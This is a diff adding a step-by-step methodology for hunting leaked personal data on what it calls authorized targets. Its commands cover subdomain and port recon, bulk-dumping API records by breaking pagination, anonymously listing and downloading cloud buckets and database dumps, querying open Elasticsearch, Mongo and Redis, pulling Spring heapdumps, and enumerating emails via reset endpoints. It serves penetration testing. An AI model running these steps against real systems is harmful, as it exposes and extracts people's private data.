@@ -1,0 +1,312 @@
+================================================================================
+ HIDDEN PII / SENSITIVE-DATA LEAK HUNT — STEP-BY-STEP METHODOLOGY
+ Scope: authorized targets only. Read §0 before packet one.
+================================================================================
+
+WHY THIS DOCUMENT IS DIFFERENT
+Most "find PII" guides stop at subfinder | httpx | nuclei. That pipeline finds
+banners, not data. This one is built around a single idea:
+
+    PII leaks where the app was convenient, not where it was documented.
+
+So every phase below targets a *convenience artifact*: an export button, a
+forgotten staging host, a heap dump, a spreadsheet someone published, a bucket
+named after a hostname, a backup left by a deploy script. You are not scanning
+for vulnerabilities. You are reconstructing the org's data plumbing and then
+walking into the rooms nobody locked.
+
+RULES OF ENGAGEMENT
+  1. Read-only first. GET before POST. Never trigger a mass email blast.
+  2. Tag every request:      -H 'X-Hunt-Tag: pii-<runid>-<seq>'
+  3. Baseline before probe; save raw request + response to evidence/.
+  4. A hit is a string. A finding is a screenshot with a real record in it.
+  5. Stop and check scope before touching a third-party bucket or SaaS tenant.
+
+PII TAXONOMY — what you are actually grepping for
+  identity   : full name, DOB, national ID/SSN, passport, photo, signature
+  contact    : email, phone, postal address, GPS, IP
+  financial  : card PAN, IBAN, salary, invoice, tax id, payout account
+  auth       : password hash, reset token, API key, session, JWT, MFA seed
+  health/HR  : diagnosis, prescription, leave reason, performance review
+  corporate  : internal hostnames, employee directory, org chart, roadmap
+  behavioral : purchase history, support tickets, chat transcripts, device IDs
+
+--------------------------------------------------------------------------------
+ PHASE 0 — SETUP (once)
+--------------------------------------------------------------------------------
+go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
+go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest
+go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
+go install github.com/projectdiscovery/httpx/cmd/httpx@latest
+go install github.com/projectdiscovery/katana/cmd/katana@latest
+go install github.com/lc/gau/v2/cmd/gau@latest
+go install github.com/tomnomnom/waybackurls@latest
+go install github.com/ffuf/ffuf/v2@latest
+pip install xlsx2csv --break-system-packages
+apt-get install -y jq exiftool git
+
+mkdir -p pii/{subs,live,urls,data,evidence}
+export RUN=$(date +%s)
+
+--------------------------------------------------------------------------------
+ PHASE 1 — SUBDOMAIN FLOOR (the boring 20%, done properly)
+--------------------------------------------------------------------------------
+The trick is not the tool, it is the *source split*. Passive-only first, so the
+target never sees you while you build the map.
+
+  subfinder -dL roots.txt -all -recursive -silent -o pii/subs/passive.txt
+
+  # CT-only pass, time-boxed to the last 18 months — new hosts, not archaeology
+  curl -s "https://crt.sh/?q=%25.example.com&output=json" \
+    | jq -r '.[] | select(.not_before > "2025-05-01") | .name_value' \
+    | tr ',' '\n' | sed 's/\*\.//' | sort -u >> pii/subs/passive.txt
+
+  # per-customer vanity hosts: the multi-tenant PII seam
+  grep -Ei '^[a-z0-9-]+\.(app|portal|admin|my)\.' pii/subs/passive.txt \
+    | awk -F. '{print $1}' | sort -u > pii/subs/tenants.txt
+
+UNIQUE ANGLE — split-horizon detection: resolve the same name against three
+resolvers. A name that resolves only on the internal resolver is an internal app
+that leaked into public DNS.
+
+  for r in 1.1.1.1 8.8.8.8 9.9.9.9; do
+    dnsx -l pii/subs/passive.txt -r $r -a -resp-only -silent | sort -u > pii/subs/via-$r.txt
+  done
+  comm -23 pii/subs/via-1.1.1.1.txt pii/subs/via-8.8.8.8.txt > pii/subs/odd-resolver.txt
+
+--------------------------------------------------------------------------------
+ PHASE 2 — LIVE SURFACE + PORT REALITY
+--------------------------------------------------------------------------------
+  naabu -list pii/subs/passive.txt -p - -exclude-cdn -verify -passive \
+        -rate 2000 -c 25 -json -o pii/ports.json -silent
+
+  jq -r '[.host,.port]|@tsv' pii/ports.json | awk '{print $1":"$2}' \
+    | httpx -silent -td -sc -title -favicon -mmh3 -json -o pii/live/all.json
+
+UNIQUE ANGLE — favicon clustering. Every deployment of the same app returns the
+same mmh3 hash. One hash with 14 hosts = 13 forgotten environments of the app
+that holds the data. Sort by hash frequency, take the clusters, dump the hosts.
+
+  jq -r 'select(.hash.mmh3 != null) | "\(.hash.mmh3)\t\(.url)"' pii/live/all.json \
+    | sort | awk -F'\t' '{c[$1]++; l[$1]=l[$1]" "$2} END{for(h in c) if(c[h]>2) print c[h],h,l[h]}' \
+    | sort -rn > pii/live/clusters.txt
+
+Then re-probe every clustered host with real depth:
+  awk '{for(i=3;i<=NF;i++) print $i}' pii/live/clusters.txt > pii/live/forgotten.txt
+  httpx -l pii/live/forgotten.txt -silent -sc -title -td -json -o pii/live/forgotten.json
+
+--------------------------------------------------------------------------------
+ PHASE 3 — URL ARCHAEOLOGY (gau + CDX, filtered like a surgeon)
+--------------------------------------------------------------------------------
+Do NOT dump 400k URLs and grep by hand. Push the filters into the API.
+
+  # biggest files first: length desc is the highest-signal sort there is
+  curl -s "http://web.archive.org/cdx/search/cdx?url=*.example.com&output=json\
+&fl=original,timestamp,mimetype,length&collapse=urlkey\
+&filter=statuscode:200&filter=!mimetype:text/html&limit=20000" \
+    | jq -r '.[1:][] | @tsv' | sort -k4 -rn | head -2000 > pii/urls/big-files.tsv
+
+  # multi-provider, subs included, only data-ish paths
+  gau --subs --providers wayback,commoncrawl,otx,urlscan --threads 5 \
+      --blacklist png,jpg,css,woff,svg,ico --o pii/urls/gau.txt
+
+  grep -Ei '/(export|download|report|invoice|billing|customer|member|user|employee|payroll|student|patient|order|ticket|lead|subscriber|contact)s?(/|\?|$)' \
+       pii/urls/gau.txt | sort -u > pii/urls/data-paths.txt
+
+UNIQUE ANGLE — deleted-page recovery. Filter CDX for 200 *then*, 404 *now*.
+A page that was public with PII and has since been removed is still PII, and it
+is usually still cached or still served on an old host.
+
+  while read u; do
+    [ "$(curl -s -o /dev/null -w '%{http_code}' -m 8 "$u")" = "404" ] && echo "$u"
+  done < pii/urls/data-paths.txt > pii/urls/now-dead.txt
+
+--------------------------------------------------------------------------------
+ PHASE 4 — LIVE CRAWL + FORM FILL (katana, JS-aware)
+--------------------------------------------------------------------------------
+  katana -list pii/live/forgotten.txt -jc -kf all -d 4 -fs rdn -c 10 \
+         -ef woff,css,png,svg -jsonl -o pii/urls/katana.jsonl
+
+  jq -r '.request.endpoint' pii/urls/katana.jsonl | sort -u >> pii/urls/data-paths.txt
+
+UNIQUE ANGLE — sourcemap harvest. If any bundle ships a .map, you get the
+original tree: route names, field names, and often the export controller path
+that no menu links to.
+
+  grep -oE '"[^"]+\.js"' pii/urls/katana.jsonl | tr -d '"' | sort -u \
+    | while read j; do curl -s "$j.map" -o /dev/null -w "%{http_code} $j.map\n"; done \
+    | grep ^200 | awk '{print $2}' > pii/urls/maps.txt
+  xargs -a pii/urls/maps.txt -n1 curl -s | jq -r '.sources[]?' 2>/dev/null | sort -u
+
+--------------------------------------------------------------------------------
+ PHASE 5 — CONTENT DISCOVERY BY EXTENSION (not by word)
+--------------------------------------------------------------------------------
+Wordlists find directories. Extensions find *data*. Fuzz the extension axis on
+every directory that returned 200 or 401.
+
+  printf '%s\n' index backup export dump data list all report export-full \
+    > pii/words/stems.txt
+  printf '.csv\n.xls\n.xlsx\n.json\n.xml\n.pdf\n.zip\n.sql\n.bak\n.txt\n.ndjson\n' \
+    > pii/words/exts.txt
+
+  ffuf -u https://TARGET/api/FUZZ -w pii/words/stems.txt -e .csv,.xls,.xlsx,.json,.pdf,.zip,.sql,.bak \
+       -mc 200,206,401,403 -fs 0 -rate 40 -o pii/data/ffuf-stems.json
+
+UNIQUE ANGLE — format negotiation. Any JSON endpoint is a CSV endpoint until
+proven otherwise. Swap three things and watch Content-Type:
+
+  curl -s -D- -o /dev/null "https://TARGET/api/orders?format=csv"        | grep -i content-type
+  curl -s -D- -o /dev/null "https://TARGET/api/orders" -H 'Accept: text/csv' | grep -i content-type
+  curl -s -D- -o /dev/null "https://TARGET/api/orders.json"              | grep -i content-type
+
+A `text/csv` or `application/vnd.ms-excel` response is a bulk PII surface, and
+it is almost never rate-limited the way the UI is.
+
+--------------------------------------------------------------------------------
+ PHASE 6 — VOLUME ABUSE (turn a page into a dump)
+--------------------------------------------------------------------------------
+Every list endpoint has a pagination contract. Break it in this order:
+
+  ?limit=1000        ?limit=99999       ?per_page=5000
+  ?page=1&size=10000 ?offset=0&count=all ?all=true
+  ?sort=created_at&order=desc            <-- newest records = live PII
+  ?fields=*          ?expand=*           ?include=all
+
+Loop until the response stops growing:
+  for n in 100 500 1000 5000 10000 50000; do
+    printf "%s " "$n"
+    curl -s "https://TARGET/api/customers?limit=$n" | wc -c
+  done
+
+UNIQUE ANGLE — the "sort + cursor" trick. Sorting by created_at desc and paging
+backwards reaches records the UI never shows (oldest, deleted, soft-removed).
+Combine with `?include_deleted=true` / `?status=all` / `?archived=1`.
+
+--------------------------------------------------------------------------------
+ PHASE 7 — BUCKET AND BLOB DERIVATION
+--------------------------------------------------------------------------------
+Bucket names are hostnames minus dots, plus suffixes. Derive, then test
+anonymously — never with your keys.
+
+  sed 's/\./-/g; s/^www-//' pii/subs/passive.txt | sort -u > pii/subs/bucket-seeds.txt
+  for s in $(cat pii/subs/bucket-seeds.txt); do
+    for suf in "" -prod -dev -staging -backup -backups -assets -static -media \
+               -uploads -exports -reports -data -db -dump -archive -logs; do
+      echo "$s$suf"
+    done
+  done | sort -u > pii/subs/buckets.txt
+
+  while read b; do
+    code=$(curl -s -o /dev/null -w '%{http_code}' "https://$b.s3.amazonaws.com/")
+    [ "$code" = "200" ] && echo "LISTING $b"
+    [ "$code" = "404" ] && echo "CLAIMABLE $b"
+  done < pii/subs/buckets.txt
+
+  aws s3 ls "s3://$b" --no-sign-request
+  aws s3 cp "s3://$b/dump.sql" . --no-sign-request
+
+Same pattern for GCS (`storage.googleapis.com/<name>`), Azure
+(`<name>.blob.core.windows.net/<container>?restype=container&comp=list`).
+
+--------------------------------------------------------------------------------
+ PHASE 8 — CODE AND DOC LEAKS (GitHub, Postman, Swagger)
+--------------------------------------------------------------------------------
+  # org-wide dorks, run in GitHub code search UI or gh api
+  org:ACME filename:.env
+  org:ACME "password" OR "secret" OR "token"
+  org:ACME "BEGIN RSA PRIVATE KEY"
+  org:ACME filename:*.sql "INSERT INTO"
+  org:ACME "s3.amazonaws.com" "ACME"
+  org:ACME path:*.tf  "bucket"
+
+  # public API docs are maps to every PII field
+  for p in swagger.json openapi.json api-docs v3/api-docs swagger/v1/swagger.json; do
+    curl -s -o /dev/null -w "%{http_code} $p\n" "https://TARGET/$p"
+  done
+
+UNIQUE ANGLE — read the schema, not the endpoint. A swagger file names every
+field the API returns, including ones the UI hides (`ssn`, `internal_notes`,
+`payout_iban`). Then request with `?fields=` or a GraphQL selection to pull only
+those.
+
+--------------------------------------------------------------------------------
+ PHASE 9 — INFRASTRUCTURE JACKPOTS (naabu ports that are data, not web)
+--------------------------------------------------------------------------------
+  # Elasticsearch — often no auth, always full of records
+  curl -s "http://HOST:9200/_cat/indices?v"
+  curl -s "http://HOST:9200/_search?size=5&pretty=true"
+  # Mongo
+  mongosh "mongodb://HOST:27017" --quiet --eval 'db.adminCommand({listDatabases:1})'
+  # Redis
+  redis-cli -h HOST -p 6379 --no-auth-warning keys '*' | head -50
+  # Spring Boot actuator — heapdump is the crown jewel
+  curl -s "http://HOST:8080/actuator/env" | jq .
+  curl -s -o heap.hprof "http://HOST:8080/actuator/heapdump"
+  strings heap.hprof | grep -Eio '[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}' | sort -u
+
+UNIQUE ANGLE — heapdump mining. A Spring heapdump contains live session objects,
+DB rows in flight, config secrets and full user records. `strings | grep` for
+email/phone/`jdbc:` patterns, then `jvisualvm` or MAT if you need structure.
+
+--------------------------------------------------------------------------------
+ PHASE 10 — METADATA AND SECOND-ORDER LEAKS
+--------------------------------------------------------------------------------
+  # PDF/DOCX metadata: author names, internal paths, software, sometimes users
+  exiftool -a -G1 -s *.pdf | grep -Ei 'author|creator|company|title|lastmodifiedby'
+
+  # XLSX: hidden sheets are where the "real" data lives
+  xlsx2csv -a export.xlsx | head -100
+  unzip -o export.xlsx -d x && ls x/xl/worksheets/
+
+  # Google Sheets published as CSV — swap the view URL
+  #   .../edit#gid=0  ->  .../export?format=csv&gid=0
+
+UNIQUE ANGLE — the email existence oracle. Harvest the pattern from
+`/.well-known/security.txt`, press releases and commits (`first.last@`), then
+confirm which addresses are real via the reset endpoint's differing response —
+without sending mail if the API returns a boolean.
+
+--------------------------------------------------------------------------------
+ PHASE 11 — RANK, VERIFY, PROVE  (no false positives)
+--------------------------------------------------------------------------------
+Score every candidate before you write a word:
+
+  PII density   1 record = 1, a page = 3, a file = 5, a dump = 8
+  Auth needed   none = +3, any account = +1, admin = 0
+  Breadth       one tenant = 1, all tenants = 5
+  Freshness     record dated this year = +2
+
+Three-strike verification, mandatory:
+  1. Re-request from a clean session, no cookies.
+  2. Re-request from a second IP/session; confirm identical.
+  3. Prove it is real data, not a fixture: does the record have a plausible
+     timestamp, a consistent id, a related second record?
+
+Then the screenshot test: one frame showing the URL bar, the record, and the
+field names. If a stranger cannot read the impact in ten seconds, it is not a
+finding yet.
+
+Evidence bundle per finding:
+  evidence/F-00N/{request.raw,response.raw,baseline.response,screenshot.png,SHA256SUMS}
+
+--------------------------------------------------------------------------------
+ PHASE 12 — NEVER STOP (pivot generators)
+--------------------------------------------------------------------------------
+When a branch closes, take the same surface and change one axis:
+  role        anon -> user B -> invited -> expired -> admin
+  transport   GET -> POST form -> POST JSON -> multipart -> text/plain
+  parser      query -> path -> header -> cookie -> filename
+  format      json -> csv -> xml -> pdf -> xlsx
+  time        now -> 6 months ago (Wayback) -> at launch
+  tenant      own org -> sibling org -> vanity host
+  depth       collection -> item -> subresource -> subresource of subresource
+
+Every closed branch gets a line in dead-ends.txt with the payload and the reason,
+so it is never re-run blind and always revivable.
+
+================================================================================
+ THE ONE-LINE SUMMARY
+ Find the plumbing (subdomains, ports, clusters), find the convenience artifacts
+ (exports, formats, buckets, dumps), break the volume contract, prove with a
+ screenshot, and pivot on one axis at a time until the map is empty.
+================================================================================
